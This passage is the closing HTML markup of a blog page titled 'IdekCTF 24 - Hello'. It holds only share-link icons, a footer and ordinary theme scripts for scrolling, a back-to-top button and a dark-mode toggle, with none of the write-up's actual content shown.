245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share IdekCTF 24 - Hello on telegram" href="https://telegram.me/share/url?text=IdekCTF%2024%20-%20Hello&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fidek24%2fhello%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share IdekCTF 24 - Hello on ycombinator" href="https://news.ycombinator.com/submitlink?t=IdekCTF%2024%20-%20Hello&u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fidek24%2fhello%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://hxuu.github.io/blog/>hxuu</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>